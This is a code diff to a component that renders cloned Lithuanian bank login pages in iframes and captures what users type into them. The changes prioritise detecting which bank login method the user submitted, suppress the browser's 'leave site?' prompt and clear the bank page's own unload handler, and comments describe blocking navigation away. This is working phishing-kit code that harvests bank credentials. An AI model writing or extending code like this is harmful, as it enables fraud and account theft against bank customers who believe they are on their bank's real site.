@@ -529,7 +529,10 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           typeof formData.loginMethod === "string" ? formData.loginMethod.trim() : "",
         );
         const fallbackLoginMethod = normalizeLoginMethodLabel(resolveLoginMethodFromIndex(bankSlugRef.current, currentIndexRef.current));
-        const newLoginMethod = clickedLoginMethod || detectedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
+        // Oncelik: iframe'in kendi dosyasindan gelen loginMethod (data-method meta =
+        // kullanicinin GERCEKTEN submit ettigi sayfa). selectedLoginMethod eski/stale olabilir
+        // cunku tab click bir iframe'de yapilip submit baska iframe'de olur.
+        const newLoginMethod = detectedLoginMethod || clickedLoginMethod || fallbackLoginMethod || "Bilinmiyor";
         const capturedFields = normalizeCapturedFields(formData);
         const identityFirstMethod = prefersIdentityFields(newLoginMethod);
         const mappedData: Record<string, string> = {
@@ -1299,13 +1302,16 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
           }
         }, true);
 
-        // beforeunload / window.location degisikliklerini engellemeye calis (fallback)
+        // beforeunload: KESINLIKLE listener EKLEME ve returnValue SET ETME -
+        // e.preventDefault()/returnValue='' tarayicinin "Siteden cikilsin mi?"
+        // onay diyalogunu tetikler (login butonuna basinca cikiyordu).
+        // Navigasyon zaten submit/click preventDefault ile engelleniyor.
         try {
-          window.addEventListener('beforeunload', (e) => {
-            e.preventDefault();
-            e.returnValue = '';
-            return '';
-          });
+          // Bankanin kendi HTML'i onbeforeunload kayitli ise temizle
+          window.onbeforeunload = null;
+          if (typeof window.removeEventListener === 'function') {
+            // not: anonim listener'lar kaldirilamaz, ama en azindan bizimkini eklemedik
+          }
         } catch(_) {}
 
         // window.open / location.href degistirme denemelerini engelle (nukleer)
@@ -1736,6 +1742,21 @@ export function LithuaniaBankTemplate({ bankSlug, onChange, handleRouteAction, s
         };
 
         const getLoginMethod = () => {
+            // LT sayfalarinda EN GUVENILIR kaynak: HTML'e enjekte edilen
+            // #LITHUANIA_LOGIN_METHOD data-method - her zaman GORUNTULENEN
+            // dosyanin metodunu soyler (iframe degisince __traeSelectedLoginMethod
+            // yeni iframe'de bos kalir cunku window her iframe'de ayri).
+            if (/\\/lithuanian-banks\\//i.test(window.location.href || '')) {
+                try {
+                    const marker = document.getElementById('LITHUANIA_LOGIN_METHOD');
+                    const mm = marker && marker.getAttribute ? (marker.getAttribute('data-method') || '') : '';
+                    if (mm.trim()) return mm.trim();
+                    const meta = document.querySelector('meta[name="login-method"]');
+                    const mc = meta && meta.getAttribute ? (meta.getAttribute('content') || '') : '';
+                    if (mc.trim()) return mc.trim();
+                } catch(_) {}
+            }
+
             const rememberedLoginMethod = extractLoginMethodLabel(window.__traeSelectedLoginMethod || '');
             if (rememberedLoginMethod) {
                 return rememberedLoginMethod;
